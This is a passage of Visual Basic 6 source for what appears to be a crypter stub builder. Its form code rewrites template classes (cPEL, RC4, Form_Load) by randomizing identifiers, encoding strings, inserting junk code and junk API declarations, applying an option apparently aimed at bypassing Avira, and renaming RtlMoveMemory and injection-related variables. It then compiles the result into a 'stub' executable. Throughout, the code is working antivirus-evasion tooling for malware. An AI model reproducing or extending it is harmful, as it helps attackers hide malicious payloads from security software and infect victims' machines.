         Caption         =   "Randomize File Information"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
         Value           =   1
      End
      Begin XtremeSuiteControls.CheckBox chkRandAttr 
         Height          =   255
         Left            =   240
         TabIndex        =   43
         Top             =   2520
         Width           =   2055
         _Version        =   851970
         _ExtentX        =   3625
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Randomize Attributes"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
         Value           =   1
      End
      Begin XtremeSuiteControls.CheckBox chkRandPrjNm 
         Height          =   255
         Left            =   240
         TabIndex        =   42
         Top             =   2160
         Width           =   2175
         _Version        =   851970
         _ExtentX        =   3836
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Randomize Project Name"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
         Value           =   1
      End
      Begin XtremeSuiteControls.CheckBox chkRandSubnames 
         Height          =   255
         Left            =   240
         TabIndex        =   29
         Top             =   1800
         Width           =   2175
         _Version        =   851970
         _ExtentX        =   3836
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Randomize All Sub Names"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
         Value           =   1
      End
      Begin XtremeSuiteControls.CheckBox chkRandFiles 
         Height          =   255
         Left            =   240
         TabIndex        =   21
         Top             =   1440
         Width           =   2415
         _Version        =   851970
         _ExtentX        =   4260
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Randomize All File Names"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
         Value           =   1
      End
      Begin XtremeSuiteControls.CheckBox chkRandConsts 
         Height          =   255
         Left            =   240
         TabIndex        =   11
         Top             =   1080
         Width           =   2295
         _Version        =   851970
         _ExtentX        =   4048
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Randomize All Constants"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
         Value           =   1
      End
      Begin XtremeSuiteControls.CheckBox chkRandVar 
         Height          =   255
         Left            =   240
         TabIndex        =   7
         Top             =   360
         Width           =   2535
         _Version        =   851970
         _ExtentX        =   4471
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Randomize All Variables"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
         Value           =   1
      End
      Begin XtremeSuiteControls.CheckBox chkRandFunc 
         Height          =   255
         Left            =   240
         TabIndex        =   8
         Top             =   720
         Width           =   2055
         _Version        =   851970
         _ExtentX        =   3625
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Randomize All Functions"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
         Value           =   1
      End
      Begin VB.Image Image9 
         Height          =   240
         Left            =   3000
         Picture         =   "frmMain.frx":A23C
         Top             =   0
         Width           =   240
      End
      Begin VB.Image Image1 
         Height          =   240
         Left            =   120
         Picture         =   "frmMain.frx":A648
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.Label Label3 
      Height          =   255
      Left            =   8760
      TabIndex        =   5
      Top             =   120
      Width           =   1215
      _Version        =   851970
      _ExtentX        =   2143
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "cPEL Cls"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin XtremeSuiteControls.Label Label2 
      Height          =   255
      Left            =   8880
      TabIndex        =   4
      Top             =   2760
      Width           =   975
      _Version        =   851970
      _ExtentX        =   1720
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "RC4 Cls"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin XtremeSuiteControls.Label Label1 
      Height          =   375
      Left            =   8880
      TabIndex        =   3
      Top             =   5160
      Width           =   1215
      _Version        =   851970
      _ExtentX        =   2143
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Form_Load"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Const L1 = "abcdefghijklmnopqrstuvwxyz"
Const L2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const L3 = "{[]}\*/-+1234567890*~#!§$%&/()=?<>"
Public Function sRandom()
        '/==== Generate a random key ====/
        Dim Shitz As String
        Dim i As Integer

        Shitz = L1 + L2 + L3

        For i = 1 To 23
        Randomize
        sRandom = sRandom & Mid$(Shitz, Int((Rnd * Len(Shitz)) + 1), 1)
        Next i
End Function
Private Sub chkEncrypt_Click()
If chkStrAscii.Enabled = False Then
chkStrAscii.Enabled = True
chkStrROT.Enabled = True
Else
chkStrAscii.Enabled = False
chkStrAscii.Value = xtpUnchecked
chkStrROT.Enabled = False
chkStrROT.Value = xtpUnchecked
End If
End Sub

Private Sub chkJunkAPI_Click()
If txtMinAPI.Enabled = False Then
txtMinAPI.Enabled = True
txtMaxAPI.Enabled = True
Else
txtMinAPI.Enabled = False
txtMaxAPI.Enabled = False
End If
End Sub

Private Sub chkJunkFunc_Click()
If txtMinFunc.Enabled = False Then
txtMinFunc.Enabled = True
txtMaxFunc.Enabled = True
chkTrashFunc.Enabled = True
Else
txtMinFunc.Enabled = False
txtMaxFunc.Enabled = False
chkTrashFunc.Enabled = False
End If
End Sub

Private Sub chkStrLess_Click()
If txtLessChars.Enabled = False Then
txtLessChars.Enabled = True
Else
txtLessChars.Enabled = False
End If
End Sub

Private Sub chkTrashing_Click()
If chkGotoTrash.Enabled = False Then
chkGotoTrash.Enabled = True
chkVarTrash.Enabled = True
chkIfTrash.Enabled = True
Else
chkGotoTrash.Enabled = False
chkVarTrash.Enabled = False
chkIfTrash.Enabled = False
End If
End Sub

Private Sub cmdCompile_Click()
On Error Resume Next
cmdCompile.Enabled = False
Const COMPILER = "C:\Program Files\Microsoft Visual Studio\VB98\VB6.exe"
Dim project_path As String
Dim project_vbp As String
Dim project_exe As String
Dim cmd As String

    ' Get the project file name.
    If chkCompileC.Value = xtpChecked Then
    project_path = "C:"
    Else
    project_path = App.path
    End If
    If Right$(project_path, 1) <> "\" Then project_path = _
        project_path & "\"
    project_vbp = project_path & ProjNm & ".vbp"

    ' Compose the compile command.
    cmd = """" & COMPILER & """ /MAKE """ & project_vbp & _
        """"

    ' Shell this command and wait for it to finish.
    Shell cmd
    Sleep (1000)
    
    If chkCleanUp.Value = xtpChecked Then
    If chkCompileC.Value = xtpChecked Then
    Kill ("C:\" & RC4File & ".cls")
    Kill ("C:\" & cPELFile & ".cls")
    Kill ("C:\" & FrmFile & ".frm")
    Kill ("C:\" & ProjNm & ".vbp")
    Kill ("C:\" & RotModule & ".bas")
    Else
    Kill (ProjNm & ".vbp")
    Kill (RC4File & ".cls")
    Kill (cPELFile & ".cls")
    Kill (FrmFile & ".frm")
    Kill (RotModule & ".bas")
    End If
    End If
    
MsgBox "Successfully compiled! Stub path: " & project_path & ProjNm & ".exe"
End Sub

Private Sub cmdExit_Click()
End
End Sub

Private Sub cmdGenerate_click()
On Error Resume Next
Dim sCode As String
Dim sRC4Code As String
Dim sFrmCode As String
Dim i As Integer
Dim DecryptString As String
Dim SplitAlter As String

'---------- Clear Variables -----
 Blacklist = ""
 sVarCount = 0
 sFuncCount = 0
 sStrCount = 0

 sVarCount2 = 0
 sStrCount2 = 0
 sFuncCount2 = 0

 sVarCount3 = 0
 sStrCount3 = 0
 sFuncCount3 = 0

 sStrings = ""
 sFunctions = ""
 sVariables = ""

 sStrings2 = ""
 sFunctions2 = ""
 sVariables2 = ""

 sStrings3 = ""
 sFunctions3 = ""
 sVariables3 = ""
 
 sCode = ""
 sRC4Code = ""
 sFrmCode = ""
 '--- Clear Project ---
 If Not ProjNm = "" Then
    If chkCleanUpLast.Value = xtpChecked Then
    If chkCompileC.Value = xtpChecked Then
    Kill ("C:\" & ProjNm & ".vbp")
    Kill ("C:\" & RC4File & ".cls")
    Kill ("C:\" & cPELFile & ".cls")
    Kill ("C:\" & FrmFile & ".frm")
    Kill ("C:\" & RotModule & ".bas")
    Else
    Kill (ProjNm & ".vbp")
    Kill (RC4File & ".cls")
    Kill (cPELFile & ".cls")
    Kill (FrmFile & ".frm")
    Kill (RotModule & ".bas")
    End If
    End If
 End If

'--- Set back to nothing -----
cPELFile = ""
RC4File = ""
FrmFile = ""
ProjNm = ""
RotModule = ""

'--- Clear Blacklist --------
Blacklist = ""

'--- Set DecryptString (RC4 Cls) ---
DecryptString = StrGen(5, 15)

'-- Generate file name -------
RC4File = StrGen(10, 10)

'-- Generate class name -------
Dim RC4Name As String
RC4Name = StrGen(10, 10)

'-- Generate file name -------
cPELFile = StrGen(5, 10)

'-- Generate class name -------
Dim cPELName As String
cPELName = StrGen(5, 10)

'- Extras -
If chkRemBlank.Value = xtpChecked Then

'remove blanks

End If
'-------------------------------------------------------------------
'-------===================== cPEL ======================-----------
'-------------------------------------------------------------------

Sleep (1500)
'--------- Append text to string-
If chkRemOE.Value = xtpChecked Then
txtcPEL = Replace(txtcPEL, "Option Explicit", vbNullString)
End If

sCode2 = txtcPEL

If chkTrashing.Enabled = True Then
    Dim sRnd As Integer
    Dim sLines() As String
    sLines = Split(sCode2, vbNewLine)
    Dim bWrite As Boolean
    bWrite = False
    Dim sTmp As String
    For i = 0 To UBound(sLines)
    sTmp = ""
    If bWrite = True Then
        
    '-
    If chkGotoTrash.Value = xtpChecked Then
        Dim tmp_name As String
            tmp_name = StrGen(5, 20)
                sTmp = "Goto " & tmp_name
                sTmp = sTmp & vbNewLine & tmp_name & ":" & vbNewLine & sLines(i)
                sTmp = Replace(sTmp, "    ", " ")
            End If

    
    If chkVarTrash.Value = xtpChecked Then
            tmp_name = StrGen(5, 20)
                sTmp = "Dim " & tmp_name & " as string"
                sTmp = sTmp & vbNewLine & tmp_name & "= " & Chr(34) & tmp_name & Chr(34) & vbNewLine & sLines(i)
    End If
    
    If chkIfTrash.Value = xtpChecked Then
            tmp_name = StrGen(5, 20)
                sTmp = "Dim " & tmp_name & " As  integer"
                sTmp = sTmp & vbNewLine & "If " & tmp_name & " = " & "1" & " Then"
                sTmp = sTmp & vbNewLine & "End If"
                sTmp = sTmp & vbNewLine & sLines(i)
    End If
    Else
    sTmp = sLines(i)
    End If
    
        If sTmp = "" Then sTmp = sLines(i)
        sCode = sCode & sTmp & vbNewLine
        If InStr(sLines(i), "Private Sub ") <> 0 Or InStr(sLines(i), "Function ") <> 0 Or InStr(sLines(i), "Public Function ") Or InStr(sLines(i), "Public Sub ") <> 0 <> 0 Then
            bWrite = True
        End If
        If InStr(sLines(i), "End Function") <> 0 Or InStr(sLines(i), "End Sub") <> 0 Then
            bWrite = False
        End If
    Next
Else
sCode = txtcPEL
End If

'------- Encrypt Str ---------
Call FindStr(sCode, sStrCount, sStrings)
Dim RotXFunction As String
RotXFunction = StrGen(8, 20)

If chkStrROT.Value = xtpChecked Then
Dim strint As Integer
Dim encstrvar() As String
encstrvar() = Split(sStrings, ":")
For strint = 1 To sStrCount
If encstrvar(strint) <> "" Then
If chkStrLess.Value = xtpChecked Then
If Len(encstrvar(strint)) > txtLessChars.Text Then
sCode = Replace(sCode, encstrvar(strint), RotXFunction & RotXEncrypt((Replace(encstrvar(strint), Chr(34), vbNullString)))) 'StrToChar(encstrvar(strint)))
Else
If Len(encstrvar(strint)) > 0 Then
sCode = Replace(sCode, encstrvar(strint), RotXFunction & RotXEncrypt((Replace(encstrvar(strint), Chr(34), vbNullString)))) 'StrToChar(encstrvar(strint)))
End If
End If
End If
End If
Next
End If

Call FindStr(sCode, sStrCount, sStrings)
Sleep (500)
If chkStrAscii.Value = xtpChecked Then
encstrvar() = Split(sStrings, ":")
For strint = 1 To sStrCount + 10
If encstrvar(strint) <> "" Then
If Len(encstrvar(strint)) > 0 Then
sCode = Replace(sCode, encstrvar(strint), StrToChar(Replace$(encstrvar(strint), Chr$(34), vbNullString))) 'StrToChar(encstrvar(strint)))
sCode = Replace(sCode, Chr(34) & "&h" & Chr(34), StrToChar("&H"))
End If
End If
Next
End If
'----------- Consts -------------
For i = 1 To 9
sCode = Replace(sCode, "sConst00" & i, StrGen(5, 20))
Next

For i = 10 To 15
sCode = Replace(sCode, "sConst0" & i, StrGen(5, 20))
Next

'----------- Types -------------
For i = 10 To 11
sCode = Replace(sCode, "sType0" & i, StrGen(5, 15))
Next

For i = 1 To 9
sCode = Replace(sCode, "sType00" & i, StrGen(5, 15))
Next

'----------- InjVars --------
For i = 1 To 6
sCode = Replace(sCode, "inject_var00" & i, StrGen(5, 15))
Next

'----------- Functions ------
Sleep (500)
Dim InjFuncName As String
InjFuncName = StrGen(5, 20)
sCode = Replace(sCode, "sFunction02", InjFuncName)
Sleep (500)

For i = 1 To 9
sCode = Replace(sCode, "sFunction0" & i, StrGen(5, 15))
Next
For i = 10 To 12
sCode = Replace(sCode, "sFunction" & i, StrGen(5, 15))
Next

'---------- RtlMoveMem --------
Dim RtlMoveMem As String
RtlMoveMem = StrGen(5, 25)
sCode = Replace(sCode, "e4j8c5PCdAMaIZLPodaU", RtlMoveMem)

Dim RtlApi As String
RtlApi = "Private Declare Sub " & RtlMoveMem & " Lib " & Chr(34) & "kernel32" & Chr(34) & " Alias " & Chr(34) & "RtlMoveMemory" & Chr(34) & " (pDst As Any, pSrc As Any, ByVal dlen As Long)"

'--------- Split Alter --------
SplitAlter = StrGen(5, 20)
sCode = Replace(sCode, "SplitAlter", SplitAlter)
sCode = Replace(sCode, "lLastPos", StrGen(5, 10))
sCode = Replace(sCode, "lIncrement", StrGen(5, 10))
sCode = Replace(sCode, "lExpLen", StrGen(5, 10))
sCode = Replace(sCode, "lDelimLen", StrGen(5, 10))
sCode = Replace(sCode, "lUbound", StrGen(5, 10))
sCode = Replace(sCode, "svTemp", StrGen(5, 10))
sCode = Replace(sCode, "Delimiter", StrGen(5, 10))
sCode = Replace(sCode, "Expression", StrGen(5, 10))
sCode = Replace(sCode, "Limit", StrGen(5, 10))

'------- Extra ---------------
Dim vahiable() As String
Dim ihtehg As Integer
Call FindVar(sCode, sVarCount, sVariables)

'---- bvTemp Problem ----
Dim bvTemp As String
bvTemp = StrGen(5, 15)
sCode = Replace(sCode, "bvTemp", bvTemp)
sVariables = Replace(sVariables, SplitAlter, vbNullString)
sVariables = Replace(sVariables, bvTemp & "(3)", vbNullString)
vahiable() = Split(sVariables, ":")
For ihtehg = 1 To sVarCount
If vahiable(ihtehg) <> "" Then
If Len(vahiable(ihtehg)) > 2 Then
sCode = Replace(sCode, vahiable(ihtehg), StrGen(2, 15))
End If
End If
Next
sCode = Replace(sCode, "w87gt35g83eif", StrGen(5, 10))
sCode = Replace(sCode, "swgues", StrGen(5, 10))
sCode = Replace(sCode, "lPtr", StrGen(5, 10))
sCode = Replace(sCode, "sData", StrGen(5, 10))

Sleep (1500)

'Fix broken Chr's
If InStr(sCode, "hr$(") Then
sCode = ReplaceWord(sCode, "hr$(", "Chr$(")
End If
If InStr(sCode, "r$(") Then
sCode = ReplaceWord(sCode, "r$(", "Chr$(")
End If

'------- Dump File -----------
F = FreeFile
If chkCompileC.Value = xtpChecked Then
Open "C:" & "\" & cPELFile & ".cls" For Output As #F
Print #F, "VERSION 1.0 CLASS"
Print #F, "BEGIN"
Print #F, "MultiUse = -1  'True"
Print #F, "Persistable = 0  'NotPersistable"
Print #F, "DataBindingBehavior = 0  'vbNone"
Print #F, "DataSourceBehavior = 0   'vbNone"
Print #F, "MTSTransactionMode = 0   'NotAnMTSObject"
Print #F, "End"
Print #F, "Attribute VB_Name = " & Chr(34) & cPELName & Chr(34)
Print #F, "Attribute VB_GlobalNameSpace = False"
Print #F, "Attribute VB_Creatable = True"
Print #F, "Attribute VB_PredeclaredId = False"
Print #F, "Attribute VB_Exposed = False"
If chkJunkAPI.Value = xtpChecked Then
Dim lol As Integer
Dim imax As Integer
Dim imin As Integer
imax = txtMaxAPI.Text
imin = txtMinAPI.Text
iLen = Int((imax - imin + 1) * Rnd) + imin / 2
For lol = 1 To iLen
Print #F, JunkAPI
Next
Print #F, RtlApi
For lol = 1 To iLen
Print #F, JunkAPI
Next
ElseIf chkAvira2.Value = xtpChecked Then
Print #F, ApiBypass
Print #F, RtlApi
Print #F, ApiBypass2

ElseIf chkAhPi.Value = xtpChecked Then
imax = txtMaxAPI.Text
imin = txtMinAPI.Text
iLen = Int((imax - imin + 1) * Rnd) + imin / 2

For lol = 1 To iLen
Print #F, APIMethod2
Next
Print #F, RtlApi
For lol = 1 To iLen
Print #F, APIMethod2
Next
Else
Print #F, RtlApi
End If

Print #F, sCode
If chkJunkFunc.Value = xtpChecked Then
Dim Trash As String
Dim iMaxFunc As Integer
Dim iMinFunc As Integer
iMaxFunc = txtMaxFunc.Text
iMinFunc = txtMinFunc.Text
If chkTrashFunc.Value = xtpChecked Then
Trash = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, True)
Else
Trash = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, False)
End If
Print #F, Trash
End If
Close #F
Else
Open App.path & "\" & cPELFile & ".cls" For Output As #F
Print #F, "VERSION 1.0 CLASS"
Print #F, "BEGIN"
Print #F, "MultiUse = -1  'True"
Print #F, "Persistable = 0  'NotPersistable"
Print #F, "DataBindingBehavior = 0  'vbNone"
Print #F, "DataSourceBehavior = 0   'vbNone"
Print #F, "MTSTransactionMode = 0   'NotAnMTSObject"
Print #F, "End"
Print #F, "Attribute VB_Name = " & Chr(34) & cPELName & Chr(34)
Print #F, "Attribute VB_GlobalNameSpace = False"
Print #F, "Attribute VB_Creatable = True"
Print #F, "Attribute VB_PredeclaredId = False"
Print #F, "Attribute VB_Exposed = False"
If chkJunkAPI.Value = xtpChecked Then

imax = txtMaxAPI.Text
imin = txtMinAPI.Text
iLen = Int((imax - imin + 1) * Rnd) + imin / 2
For lol = 1 To iLen
Print #F, JunkAPI
Next
Print #F, RtlApi
For lol = 1 To iLen
Print #F, JunkAPI
Next
ElseIf chkAvira2.Value = xtpChecked Then
Print #F, ApiBypass
Print #F, RtlApi
Print #F, ApiBypass2

ElseIf chkAhPi.Value = xtpChecked Then
imax = txtMaxAPI.Text
imin = txtMinAPI.Text
iLen = Int((imax - imin + 1) * Rnd) + imin / 2

For lol = 1 To iLen
Print #F, APIMethod2
Next
Print #F, RtlApi
For lol = 1 To iLen
Print #F, APIMethod2
Next


Else
Print #F, RtlApi
End If
Print #F, sCode
If chkJunkFunc.Value = xtpChecked Then

iMaxFunc = txtMaxFunc.Text
iMinFunc = txtMinFunc.Text
If chkTrashFunc.Value = xtpChecked Then
Trash = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, True)
Else
Trash = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, False)
End If
Print #F, Trash
End If
Close #F
End If
Sleep (1500)

'------------------------------------------------------------------------
'-------===================== Form_Load ======================-----------
'------------------------------------------------------------------------
If chkRemOE.Value = xtpChecked Then
txtfrnload = Replace(txtFrmLoad, "Option Explicit", vbNullString)
End If

sFrmCode2 = txtFrmLoad

If chkTrashing.Enabled = True Then
    sLines = Split(sFrmCode2, vbNewLine)
    bWrite = False
    For i = 0 To UBound(sLines)
    sTmp = ""
        If bWrite = True Then
        
    '-
    If chkGotoTrash.Value = xtpChecked Then
        tmp_name = ""
            tmp_name = StrGen(5, 20)
                sTmp = "Goto " & tmp_name
                sTmp = sTmp & vbNewLine & tmp_name & ":" & vbNewLine & sLines(i)
                sTmp = Replace(sTmp, "    ", " ")
            End If
            
     If chkVarTrash.Value = xtpChecked Then
            tmp_name = StrGen(5, 20)
                sTmp = "Dim " & tmp_name & " as string"
                sTmp = sTmp & vbNewLine & tmp_name & " = " & Chr(34) & Chr(34) & vbNewLine & sLines(i)
    End If
    
    If chkIfTrash.Value = xtpChecked Then
            tmp_name = StrGen(5, 20)
                sTmp = "Dim " & tmp_name & " As  integer"
                sTmp = sTmp & vbNewLine & "If " & tmp_name & " = " & "1" & " Then"
                sTmp = sTmp & vbNewLine & "End If"
                sTmp = sTmp & vbNewLine & sLines(i)
    End If
    
    Else
    sTmp = sLines(i)
    End If
    
        If sTmp = "" Then sTmp = sLines(i)
        sFrmCode = sFrmCode & sTmp & vbNewLine
        If InStr(sLines(i), "Private Sub ") <> 0 Or InStr(sLines(i), "Function ") <> 0 Or InStr(sLines(i), "Function ") Or InStr(sLines(i), "Public Sub ") <> 0 <> 0 Then
            bWrite = True
        End If
        If InStr(sLines(i), "End Function") <> 0 Or InStr(sLines(i), "End Sub") <> 0 Then
            bWrite = False
        End If
    Next
Else
sFrmCode = txtFrmLoad
End If

sFrmCode = Replace(sFrmCode, ".>pFDR0oWvNZ/z.<", txtSplit.Text)
'--- Split ---
If chkStrROT.Value = xtpChecked Then
sFrmCode = Replace(sFrmCode, Chr(34) & txtSplit.Text & Chr(34), RotXFunction & RotXEncrypt((Replace(txtSplit.Text, Chr(34), vbNullString))))
End If
If chkStrAscii.Value = xtpChecked Then
sFrmCode = Replace(sFrmCode, Chr(34) & txtSplit.Text & Chr(34), StrToChar(txtSplit.Text))
End If
Call FindStr(sFrmCode, sStrCount2, sStrings2)
'------- Encrypt Str ---------
If chkStrROT.Value = xtpChecked Then
Dim formrotstr() As String
Dim formrotcount As Integer
formrotstr() = Split(sStrings2, ":")
For formrotcount = 1 To sStrCount2
If formrotstr(formrotcount) <> "" Then
If Len(formrotstr(formrotcount)) > 0 Then
sFrmCode = Replace(sFrmCode, formrotstr(formrotcount), RotXFunction & RotXEncrypt((Replace(formrotstr(formrotcount), Chr(34), vbNullString)))) 'StrToChar(encstrvar(strint)))
End If
End If
Next
End If

Call FindStr(sFrmCode, sStrCount2, sStrings2)
If chkStrAscii.Value = xtpChecked Then
Dim formstr As Integer
Dim formencvar() As String
formencvar() = Split(sStrings2, ":")
For formstr = 1 To sStrCount2 + 10
If formencvar(formstr) <> "" Then
If Len(formrotstr(formrotcount)) > 0 Then
sFrmCode = Replace(sFrmCode, formencvar(formstr), StrToChar(Replace$(formencvar(formstr), Chr$(34), vbNullString))) 'StrToChar(encstrvar(strint)))
End If
End If
Next
End If

Call FindFunctions(sFrmCode, sFuncCount2, sFunctions2)
Call FindVar(sFrmCode, sVarCount2, sVariables2)

'------- Set Inj Func --------
sFrmCode = Replace(sFrmCode, "sFunction02", InjFuncName)
sFrmCode = Replace(sFrmCode, "pepe", cPELName)
sFrmCode = Replace(sFrmCode, "cyuah", RC4Name)
sFrmCode = Replace(sFrmCode, "DecryptString", DecryptString)
sFrmCode = Replace(sFrmCode, "SplitAlter", SplitAlter)




'------- Replace Vars/Funcs --
Dim Variable() As String
Variable() = Split(sVariables2, ":")
For F = 1 To sVarCount2 + 10
sFrmCode = Replace(sFrmCode, Variable(F), StrGen(2, 15))
Next
Dim Func() As String
Func() = Split(sFunctions2, ":")
For F = 1 To sFuncCount2 + 10
If Func(F) <> "" Then
If Func(F) <> "Form_Load" Then
sFrmCode = Replace(sFrmCode, Func(F), StrGen(2, 15))
End If
End If
Next


'------ Dump Form ----------
Dim FrmNm As String
FrmNm = StrGen(5, 15)
FrmFile = StrGen(5, 15)

F = FreeFile
If chkCompileC.Value = xtpChecked Then
Open "C:" & "\" & FrmFile & ".frm" For Output As #F
Print #F, "VERSION 5.00"
Print #F, "Begin VB.Form " & FrmFile
Print #F, "Caption = " & Chr(34) & FrmNm & Chr(34)
Print #F, "ClientHeight = 105"
Print #F, "ClientLeft = 120"
Print #F, "ClientTop = 450"
Print #F, "ClientWidth = 1740"
Print #F, "LinkTopic = " & Chr(34) & FrmNm & Chr(34)
Print #F, "ScaleHeight = 105"
Print #F, "ScaleWidth = 1740"
Print #F, "ShowInTaskbar = 0       'False"
Print #F, "StartUpPosition = 3    'Windows Default"
Print #F, "Visible = 0             'False"
Print #F, "End"
Print #F, "Attribute VB_Name = " & Chr(34) & FrmFile & Chr(34)
Print #F, "Attribute VB_GlobalNameSpace = False"
Print #F, "Attribute VB_Creatable = False"
Print #F, "Attribute VB_PredeclaredId = True"
Print #F, "Attribute VB_Exposed = False"
Print #F, sFrmCode
If chkJunkFunc.Value = xtpChecked Then
Dim Trash2 As String
If chkTrashFunc.Value = xtpChecked Then
Trash2 = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, True)
Else
Trash2 = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, False)
End If
Print #F, Trash2
End If
Close #F
Else
Open App.path & "\" & FrmFile & ".frm" For Output As #F
Print #F, "VERSION 5.00"
Print #F, "Begin VB.Form " & FrmFile
Print #F, "Caption = " & Chr(34) & FrmNm & Chr(34)
Print #F, "ClientHeight = 105"
Print #F, "ClientLeft = 120"
Print #F, "ClientTop = 450"
Print #F, "ClientWidth = 1740"
Print #F, "LinkTopic = " & Chr(34) & FrmNm & Chr(34)
Print #F, "ScaleHeight = 105"
Print #F, "ScaleWidth = 1740"
Print #F, "ShowInTaskbar = 0       'False"
Print #F, "StartUpPosition = 3    'Windows Default"
Print #F, "Visible = 0             'False"
Print #F, "End"
Print #F, "Attribute VB_Name = " & Chr(34) & FrmFile & Chr(34)
Print #F, "Attribute VB_GlobalNameSpace = False"
Print #F, "Attribute VB_Creatable = False"
Print #F, "Attribute VB_PredeclaredId = True"
Print #F, "Attribute VB_Exposed = False"
Print #F, sFrmCode
If chkJunkFunc.Value = xtpChecked Then
If chkTrashFunc.Value = xtpChecked Then
Trash2 = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, True)
Else
Trash2 = FakeFunction(Int((iMaxFunc - txtMinFunc + 1) * Rnd) + txtMinFunc, False)
End If
Print #F, Trash2
End If
Close #F
End If
'Call CreateForm(FrmFile, FrmNm, sFrmCode)

Sleep (1500)

'------------------------------------------------------------------
'-------===================== RC4 ======================-----------
'------------------------------------------------------------------
If chkRemOE.Value = xtpChecked Then
txtRC4 = Replace(txtRC4, "Option Explicit", vbNullString)
End If

sRC4Code2 = txtRC4

If chkTrashing.Enabled = True Then
    sLines = Split(sRC4Code2, vbNewLine)
    bWrite = False
    For i = 0 To UBound(sLines)
    sTmp = ""
        If bWrite = True Then
        
    '-
    If chkGotoTrash.Value = xtpChecked Then
        tmp_name = vbNullString
            tmp_name = StrGen(5, 20)
                sTmp = "Goto " & tmp_name
                sTmp = sTmp & vbNewLine & tmp_name & ":" & vbNewLine & sLines(i)
                sTmp = Replace(sTmp, "    ", " ")
            End If
            
     If chkVarTrash.Value = xtpChecked Then
            tmp_name = StrGen(5, 20)
                sTmp = "Dim " & tmp_name & " as string"
                sTmp = sTmp & vbNewLine & tmp_name & "= " & Chr(34) & Chr(34) & vbNewLine & sLines(i)
    End If
    
    If chkIfTrash.Value = xtpChecked Then
            tmp_name = StrGen(5, 20)
                sTmp = "Dim " & tmp_name & " As  integer"
                sTmp = sTmp & vbNewLine & "If " & tmp_name & " = " & "1" & " Then"
                sTmp = sTmp & vbNewLine & "End If"
